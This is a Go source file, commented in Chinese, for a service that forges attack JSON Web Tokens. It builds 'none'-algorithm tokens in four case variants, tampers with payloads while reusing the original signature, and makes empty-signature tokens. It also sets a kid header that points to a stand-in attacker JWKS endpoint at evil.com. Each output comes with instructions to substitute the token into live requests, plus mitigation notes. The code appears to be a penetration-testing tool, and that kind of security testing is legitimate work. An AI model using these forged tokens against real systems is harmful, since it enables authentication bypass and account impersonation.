package jwt

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"
	"time"
)

// JWT漏洞生成服务
type JWTVulnerabilityService struct{}

// 漏洞生成请求
type VulnRequest struct {
	VulnType      int                    `json:"vuln_type"`      // 漏洞类型 1-7
	BaseJWT       string                 `json:"base_jwt"`       // 原始JWT
	CustomPayload map[string]interface{} `json:"custom_payload"` // 自定义payload
	CustomHeader  map[string]interface{} `json:"custom_header"`  // 自定义header
}

// 漏洞生成响应
type VulnResponse struct {
	JWT         string                 `json:"jwt"`
	Header      map[string]interface{} `json:"header"`
	Payload     map[string]interface{} `json:"payload"`
	Signature   string                 `json:"signature"`
	Description string                 `json:"description"`
	TestVector  string                 `json:"test_vector"`
	Mitigation  string                 `json:"mitigation"`
	Severity    string                 `json:"severity"`
	Error       string                 `json:"error,omitempty"`
	DataSource  string                 `json:"data_source,omitempty"` // 数据来源：custom或original
}

func NewJWTVulnerabilityService() *JWTVulnerabilityService {
	return &JWTVulnerabilityService{}
}

// 生成漏洞JWT
func (s *JWTVulnerabilityService) GenerateVulnerableJWT(req VulnRequest) VulnResponse {
	switch req.VulnType {
	case 1, 2, 3, 4:
		return s.generateNoneAlgorithmAttack(req)
	case 5:
		return s.generateUnverifiedSignatureAttack(req)
	case 6:
		return s.generateJWKSAttack(req)
	case 7:
		return s.generateEmptySignatureAttack(req)
	default:
		return VulnResponse{
			Error: "未知的漏洞类型",
		}
	}
}

// 获取payload和header数据（优先使用自定义数据）
func (s *JWTVulnerabilityService) getPayloadAndHeader(req VulnRequest) (map[string]interface{}, map[string]interface{}, string) {
	var payload, header map[string]interface{}
	dataSource := "original"

	// 优先使用用户自定义的数据
	if req.CustomPayload != nil {
		payload = req.CustomPayload
		dataSource = "custom"
	} else {
		// 如果未使用自定义数据，则从原始JWT解析
		payload, header, _ = s.decodeJWT(req.BaseJWT)
	}

	// 使用自定义header或解析的header
	if req.CustomHeader != nil {
		header = req.CustomHeader
		dataSource = "custom"
	} else if header == nil {
		// 如果header还是nil，尝试解析原始JWT
		if payload == nil {
			payload, header, _ = s.decodeJWT(req.BaseJWT)
		} else {
			// 如果已经有payload但没有header，尝试只解析header
			header, _ = s.decodeHeader(req.BaseJWT)
		}
	}

	// 如果解析失败，使用默认数据
	if payload == nil {
		payload = map[string]interface{}{
			"sub": "test",
			"iat": time.Now().Unix(),
		}
		dataSource = "default"
	}

	if header == nil {
		header = map[string]interface{}{
			"typ": "JWT",
		}
	}

	return payload, header, dataSource
}

// 解码header
func (s *JWTVulnerabilityService) decodeHeader(tokenStr string) (map[string]interface{}, error) {
	parts := strings.Split(tokenStr, ".")
	if len(parts) < 1 {
		return nil, fmt.Errorf("无效的JWT格式")
	}

	// 解码header
	headerBytes, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return nil, fmt.Errorf("解码header失败: %v", err)
	}

	header := make(map[string]interface{})
	if err := json.Unmarshal(headerBytes, &header); err != nil {
		return nil, fmt.Errorf("解析header失败: %v", err)
	}

	return header, nil
}

// 生成None算法攻击（CVE-2015-2951的各种变体）
func (s *JWTVulnerabilityService) generateNoneAlgorithmAttack(req VulnRequest) VulnResponse {
	algVariants := map[int]string{
		1: "none",
		2: "None",
		3: "NoNe",
		4: "NONE",
	}

	alg := algVariants[req.VulnType]

	// 获取payload和header（优先使用自定义数据）
	payload, header, dataSource := s.getPayloadAndHeader(req)

	// 只修改alg字段，其他header字段保持原样
	header["alg"] = alg

	// 编码JWT
	headerJSON, _ := json.Marshal(header)
	payloadJSON, _ := json.Marshal(payload)

	encodedHeader := base64.RawURLEncoding.EncodeToString(headerJSON)
	encodedPayload := base64.RawURLEncoding.EncodeToString(payloadJSON)

	// None算法攻击：第三个部分为空
	jwtToken := encodedHeader + "." + encodedPayload + "."

	return VulnResponse{
		JWT:         jwtToken,
		Header:      header,
		Payload:     payload,
		Signature:   "",
		Description: fmt.Sprintf("CVE-2015-2951 - alg=%s 攻击\nJWT库可能将alg设置为'none'时跳过签名验证", alg),
		TestVector:  "使用该JWT替换正常请求中的Token，观察服务器是否接受",
		Mitigation:  "1. 验证JWT时强制检查alg字段\n2. 拒绝alg为none的JWT\n3. 使用安全的JWT库",
		Severity:    "dangerous",
		DataSource:  dataSource,
	}
}

// 生成未验证签名攻击
func (s *JWTVulnerabilityService) generateUnverifiedSignatureAttack(req VulnRequest) VulnResponse {
	if req.BaseJWT == "" {
		return VulnResponse{
			Error: "需要提供原始JWT用于未验证签名攻击",
		}
	}

	// 解析原始JWT获取签名部分
	parts := strings.Split(req.BaseJWT, ".")
	if len(parts) != 3 {
		return VulnResponse{Error: "无效的JWT格式"}
	}

	// 获取payload和header（优先使用自定义数据）
	payload, header, dataSource := s.getPayloadAndHeader(req)

	// 重新编码payload和header
	headerJSON, _ := json.Marshal(header)
	payloadJSON, _ := json.Marshal(payload)

	encodedHeader := base64.RawURLEncoding.EncodeToString(headerJSON)
	encodedPayload := base64.RawURLEncoding.EncodeToString(payloadJSON)

	// 保持原始签名不变
	modifiedJWT := encodedHeader + "." + encodedPayload + "." + parts[2]

	return VulnResponse{
		JWT:         modifiedJWT,
		Header:      header,
		Payload:     payload,
		Signature:   parts[2],
		Description: "JWT Payload篡改攻击\n在不重新签名的情况下修改Payload内容",
		TestVector:  "用修改后的JWT进行API调用",
		Mitigation:  "服务器必须验证签名完整性",
		Severity:    "dangerous",
		DataSource:  dataSource,
	}
}

// 生成JWKS攻击（CVE-2018-0114）
func (s *JWTVulnerabilityService) generateJWKSAttack(req VulnRequest) VulnResponse {
	// 获取payload和header（优先使用自定义数据）
	payload, header, dataSource := s.getPayloadAndHeader(req)

	// 只修改必要的header字段
	header["alg"] = "RS256"
	header["kid"] = "http://evil.com/.well-known/jwks.json"

	// 生成一个简单的JWT
	headerJSON, _ := json.Marshal(header)
	payloadJSON, _ := json.Marshal(payload)

	encodedHeader := base64.RawURLEncoding.EncodeToString(headerJSON)
	encodedPayload := base64.RawURLEncoding.EncodeToString(payloadJSON)

	// 生成一个模拟的签名
	signature := "fake_signature_for_demonstration"
	encodedSignature := base64.RawURLEncoding.EncodeToString([]byte(signature))

	jwtToken := encodedHeader + "." + encodedPayload + "." + encodedSignature

	return VulnResponse{
		JWT:         jwtToken,
		Header:      header,
		Payload:     payload,
		Signature:   signature,
		Description: "CVE-2018-0114 JWKS注入攻击\n通过控制kid指向恶意JWKS端点，伪造JWT签名",
		TestVector:  "使用此JWT攻击，需要将恶意JWKS部署到指定URL",
		Mitigation:  "1. 严格验证JWKS来源\n2. 使用固定的可信密钥\n3. 禁用动态JWKS获取",
		Severity:    "dangerous",
		DataSource:  dataSource,
	}
}

// 生成空签名攻击（CVE-2020-28042）
func (s *JWTVulnerabilityService) generateEmptySignatureAttack(req VulnRequest) VulnResponse {
	// 获取payload和header（优先使用自定义数据）
	payload, header, dataSource := s.getPayloadAndHeader(req)

	// 确保alg字段存在
	if _, ok := header["alg"]; !ok {
		header["alg"] = "HS256"
	}

	// 编码JWT
	headerJSON, _ := json.Marshal(header)
	payloadJSON, _ := json.Marshal(payload)

	encodedHeader := base64.RawURLEncoding.EncodeToString(headerJSON)
	encodedPayload := base64.RawURLEncoding.EncodeToString(payloadJSON)

	// 空签名攻击：第三个部分为空
	jwtToken := encodedHeader + "." + encodedPayload + "."

	return VulnResponse{
		JWT:         jwtToken,
		Header:      header,
		Payload:     payload,
		Signature:   "",
		Description: "CVE-2020-28042 空签名攻击\nJWT签名部分为空，某些实现可能错误地接受",
		TestVector:  "发送空签名的JWT，测试服务器是否接受",
		Mitigation:  "1. 验证签名长度\n2. 拒绝空签名\n3. 更新JWT库到最新版本",
		Severity:    "warning",
		DataSource:  dataSource,
	}
}

// 解码JWT获取payload和header
func (s *JWTVulnerabilityService) decodeJWT(tokenStr string) (payload, header map[string]interface{}, err error) {
	parts := strings.Split(tokenStr, ".")
	if len(parts) != 3 {
		return nil, nil, fmt.Errorf("无效的JWT格式")
	}

	// 解码header
	headerBytes, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return nil, nil, fmt.Errorf("解码header失败: %v", err)
	}

	header = make(map[string]interface{})
	if err := json.Unmarshal(headerBytes, &header); err != nil {
		return nil, nil, fmt.Errorf("解析header失败: %v", err)
	}

	// 解码payload
	payloadBytes, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		return nil, nil, fmt.Errorf("解码payload失败: %v", err)
	}

	payload = make(map[string]interface{})
	if err := json.Unmarshal(payloadBytes, &payload); err != nil {
		return nil, nil, fmt.Errorf("解析payload失败: %v", err)
	}

	return payload, header, nil
}

// 批量生成所有漏洞的JWT
func (s *JWTVulnerabilityService) GenerateAllVulnerabilities(baseJWT string, customPayload map[string]interface{}, customHeader map[string]interface{}) map[int]VulnResponse {
	responses := make(map[int]VulnResponse)

	for i := 1; i <= 7; i++ {
		req := VulnRequest{
			VulnType:      i,
			BaseJWT:       baseJWT,
			CustomPayload: customPayload,
			CustomHeader:  customHeader,
		}

		responses[i] = s.GenerateVulnerableJWT(req)
	}

	return responses
}
